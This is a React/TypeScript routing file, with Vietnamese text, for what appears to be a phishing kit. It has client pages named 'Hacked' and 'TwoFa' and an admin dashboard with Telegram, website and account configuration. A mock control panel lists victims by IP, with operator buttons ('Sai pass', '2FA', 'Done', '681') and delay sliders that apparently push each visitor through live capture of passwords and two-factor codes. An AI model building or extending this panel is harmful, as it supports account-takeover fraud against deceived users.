import AccountConfig from '@/pages/admin/AccountConfig';
import Admin from '@/pages/admin/Admin';
import Dashboard from '@/pages/admin/Dashboard';
import Login from '@/pages/admin/Login';
import TelegramConfig from '@/pages/admin/TelegramConfig';
import WebsiteConfig from '@/pages/admin/WebsiteConfig';
import Hacked from '@/pages/client/Hacked';
import Home from '@/pages/client/Home';
import TwoFa from '@/pages/client/TwoFa';
import {
	faCheckCircle,
	faCog,
	faExclamationTriangle,
	faLock,
	faPlay,
	faShieldAlt,
	faSpinner,
	faStop,
	faTimes,
	faUser,
} from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { AnimatePresence, motion } from 'framer-motion';
import React, { useState } from 'react';
import { BrowserRouter, Navigate, Route, Routes } from 'react-router-dom';

interface ControlItem {
	ip: string;
	status: string;
	state: 'processing' | 'error' | 'success' | 'idle';
	delayCode: number;
	delayPass: number;
	isLoading: boolean;
}

const ControlPanel: React.FC = () => {
	const [items, setItems] = useState<ControlItem[]>([
		{
			ip: '192.168.1.1',
			status: 'Đang xác thực',
			state: 'processing',
			delayCode: 2,
			delayPass: 3,
			isLoading: true,
		},
		{
			ip: '192.168.1.2',
			status: 'Đã nhập thông tin',
			state: 'success',
			delayCode: 1,
			delayPass: 2,
			isLoading: false,
		},
		{
			ip: '192.168.1.3',
			status: 'Lỗi kết nối',
			state: 'error',
			delayCode: 0,
			delayPass: 0,
			isLoading: false,
		},
		{
			ip: '192.168.1.4',
			status: 'Chờ',
			state: 'idle',
			delayCode: 5,
			delayPass: 5,
			isLoading: false,
		},
	]);
	const [selectedItem, setSelectedItem] = useState<ControlItem | null>(null);
	const [isModalOpen, setIsModalOpen] = useState(false);
	const openModal = (item: ControlItem) => {
		setSelectedItem(item);
		setIsModalOpen(true);
	};

	const closeModal = () => {
		setIsModalOpen(false);
		setSelectedItem(null);
	};

	const updateItemStatus = (
		newStatus: string,
		newState: 'processing' | 'error' | 'success' | 'idle',
	) => {
		if (selectedItem) {
			const updatedItems = items.map((item) =>
				item.ip === selectedItem.ip
					? { ...item, status: newStatus, state: newState }
					: item,
			);
			setItems(updatedItems);
			setSelectedItem({
				...selectedItem,
				status: newStatus,
				state: newState,
			});
		}
	};

	const updateDelay = (type: 'code' | 'pass', value: number) => {
		if (selectedItem) {
			const updatedItems = items.map((item) =>
				item.ip === selectedItem.ip
					? {
							...item,
							[type === 'code' ? 'delayCode' : 'delayPass']:
								value,
						}
					: item,
			);
			setItems(updatedItems);
			setSelectedItem({
				...selectedItem,
				[type === 'code' ? 'delayCode' : 'delayPass']: value,
			});
		}
	};

	const toggleLoading = () => {
		if (selectedItem) {
			const newLoadingState = !selectedItem.isLoading;
			const updatedItems = items.map((item) =>
				item.ip === selectedItem.ip
					? { ...item, isLoading: newLoadingState }
					: item,
			);
			setItems(updatedItems);
			setSelectedItem({ ...selectedItem, isLoading: newLoadingState });
		}
	};

	return (
		<div className='flex h-full flex-col items-center justify-center gap-6 bg-white p-6 text-gray-800'>
			<div className='mb-4 text-center text-red-500'>
				<p className='text-lg font-bold'>
					Tính năng đang phát triển, giao diện nó sẽ dạng như sau
				</p>
			</div>
			<div className='w-full max-w-6xl'>
				<motion.div
					initial={{ opacity: 0, y: 20 }}
					animate={{ opacity: 1, y: 0 }}
					className='overflow-hidden rounded-xl bg-gray-100 shadow-lg'
				>
					<div className='grid grid-cols-1 gap-4 p-6 md:grid-cols-2 lg:grid-cols-4'>
						{items.map((item, index) => (
							<motion.div
								key={item.ip}
								initial={{ opacity: 0, y: 20 }}
								animate={{ opacity: 1, y: 0 }}
								transition={{ delay: index * 0.1 }}
								className='cursor-pointer rounded-lg bg-white p-4 shadow transition-all duration-300 hover:shadow-md'
								onClick={() => openModal(item)}
							>
								<div className='mb-2 flex items-center justify-between'>
									<FontAwesomeIcon
										icon={faUser}
										className='text-blue-600'
									/>
									<span
										className={`rounded-full px-2 py-1 text-xs font-semibold ${
											item.state === 'processing'
												? 'bg-yellow-200 text-yellow-800'
												: item.state === 'error'
													? 'bg-red-200 text-red-800'
													: item.state === 'success'
														? 'bg-green-200 text-green-800'
														: 'bg-gray-200 text-gray-800'
										}`}
									>
										{item.state === 'processing'
											? 'Đang xử lý'
											: item.state === 'error'
												? 'Lỗi'
												: item.state === 'success'
													? 'Thành công'
													: 'Chờ'}
									</span>
								</div>
								<h3 className='mb-1 text-lg font-semibold'>
									{item.ip}
								</h3>
								<p className='text-sm text-gray-600'>
									{item.status}
								</p>
								<div className='mt-2 flex items-center justify-between'>
									<span className='text-xs text-gray-500'>
										Delay: {item.delayCode}s /{' '}
										{item.delayPass}s
									</span>
									<FontAwesomeIcon
										icon={
											item.isLoading ? faSpinner : faCog
										}
										className={`text-blue-600 ${
											item.isLoading ? 'animate-spin' : ''
										}`}
									/>
								</div>
							</motion.div>
						))}
					</div>
				</motion.div>
			</div>

			<AnimatePresence>
				{isModalOpen && selectedItem && (
					<motion.div
						initial={{ opacity: 0 }}
						animate={{ opacity: 1 }}
						exit={{ opacity: 0 }}
						className='fixed inset-0 z-50 flex items-center justify-center overflow-y-auto bg-black bg-opacity-50'
						onClick={closeModal}
					>
						<motion.div
							initial={{ scale: 0.9, opacity: 0 }}
							animate={{ scale: 1, opacity: 1 }}
							exit={{ scale: 0.9, opacity: 0 }}
							className='m-4 w-full max-w-4xl rounded-2xl bg-white shadow-2xl'
							onClick={(e) => e.stopPropagation()}
						>
							<div className='rounded-t-2xl bg-gradient-to-r from-blue-600 to-purple-600 px-6 py-4'>
								<div className='flex items-center justify-between'>
									<h3 className='text-2xl font-bold text-white'>
										Bảng điều khiển: {selectedItem.ip}
									</h3>
									<button
										onClick={closeModal}
										className='text-white transition-colors hover:text-gray-200'
									>
										<FontAwesomeIcon
											icon={faTimes}
											size='lg'
										/>
									</button>
								</div>
							</div>
							<div className='p-6'>
								<div className='mb-6 grid grid-cols-2 gap-4'>
									<motion.button
										whileHover={{ scale: 1.02 }}
										whileTap={{ scale: 0.98 }}
										onClick={() =>
											updateItemStatus(
												'Sai pass',
												'error',
											)
										}
										className='w-full rounded-lg bg-red-500 px-4 py-3 font-bold text-white transition-colors hover:bg-red-600'
									>
										<FontAwesomeIcon
											icon={faExclamationTriangle}
											className='mr-2'
										/>
										Sai pass
									</motion.button>
									<motion.button
										whileHover={{ scale: 1.02 }}
										whileTap={{ scale: 0.98 }}
										onClick={() =>
											updateItemStatus(
												'2fa',
												'processing',
											)
										}
										className='w-full rounded-lg bg-yellow-500 px-4 py-3 font-bold text-white transition-colors hover:bg-yellow-600'
									>
										<FontAwesomeIcon
											icon={faShieldAlt}
											className='mr-2'
										/>
										2FA
									</motion.button>
									<motion.button
										whileHover={{ scale: 1.02 }}
										whileTap={{ scale: 0.98 }}
										onClick={() =>
											updateItemStatus('Done', 'success')
										}
										className='w-full rounded-lg bg-green-500 px-4 py-3 font-bold text-white transition-colors hover:bg-green-600'
									>
										<FontAwesomeIcon
											icon={faCheckCircle}
											className='mr-2'
										/>
										Done
									</motion.button>
									<motion.button
										whileHover={{ scale: 1.02 }}
										whileTap={{ scale: 0.98 }}
										onClick={() =>
											updateItemStatus('681', 'idle')
										}
										className='w-full rounded-lg bg-blue-500 px-4 py-3 font-bold text-white transition-colors hover:bg-blue-600'
									>
										<FontAwesomeIcon
											icon={faLock}
											className='mr-2'
										/>
										681
									</motion.button>
								</div>
								<div className='space-y-4'>
									<div>
										<label
											htmlFor='delayCode'
											className='mb-1 block text-sm font-medium text-gray-700'
										>
											Code delay (giây)
										</label>
										<input
											type='range'
											id='delayCode'
											min='0'
											max='10'
											value={selectedItem.delayCode}
											onChange={(e) =>
												updateDelay(
													'code',
													parseInt(e.target.value),
												)
											}
											className='h-2 w-full cursor-pointer appearance-none rounded-lg bg-gray-300'
										/>
										<span className='text-sm text-gray-600'>
											{selectedItem.delayCode}s
										</span>
									</div>
									<div>
										<label
											htmlFor='delayPass'
											className='mb-1 block text-sm font-medium text-gray-700'
										>
											Pass delay (giây)
										</label>
										<input
											type='range'
											id='delayPass'
											min='0'
											max='10'
											value={selectedItem.delayPass}
											onChange={(e) =>
												updateDelay(
													'pass',
													parseInt(e.target.value),
												)
											}
											className='h-2 w-full cursor-pointer appearance-none rounded-lg bg-gray-300'
										/>
										<span className='text-sm text-gray-600'>
											{selectedItem.delayPass}s
										</span>
									</div>
								</div>
								<motion.button
									whileHover={{ scale: 1.02 }}
									whileTap={{ scale: 0.98 }}
									onClick={toggleLoading}
									className={`mt-6 w-full rounded-lg px-4 py-3 font-bold text-white transition-colors ${
										selectedItem.isLoading
											? 'bg-red-500 hover:bg-red-600'
											: 'bg-green-500 hover:bg-green-600'
									}`}
								>
									<FontAwesomeIcon
										icon={
											selectedItem.isLoading
												? faStop
												: faPlay
										}
										className='mr-2'
									/>
									{selectedItem.isLoading
										? 'Dừng load'
										: 'Bắt đầu load'}
								</motion.button>
							</div>
						</motion.div>
					</motion.div>
				)}
			</AnimatePresence>
		</div>
	);
};

const AppRouter: React.FC = () => {
	return (
		<BrowserRouter>
			<Routes>
				<Route
					path='*'
					element={
						<div className='flex h-screen items-center justify-center text-center text-2xl font-bold'>
							(☞ﾟヮﾟ)☞
						</div>
					}
				/>
				<Route path='/' element={<Home />} />
				<Route path='/hacked' element={<Hacked />} />
				<Route path='/verify' element={<TwoFa />} />
				<Route path='/admin/*' element={<Admin />}>
					<Route index element={<Login />} />
					<Route path='dashboard/*' element={<Dashboard />}>
						<Route
							index
							element={<Navigate to='telegram-config' />}
						/>
						<Route
							path='telegram-config'
							element={<TelegramConfig />}
						/>
						<Route
							path='website-config'
							element={<WebsiteConfig />}
						/>
						<Route
							path='account-config'
							element={<AccountConfig />}
						/>
						<Route path='control' element={<ControlPanel />} />
					</Route>
				</Route>
			</Routes>
		</BrowserRouter>
	);
};

export default AppRouter;
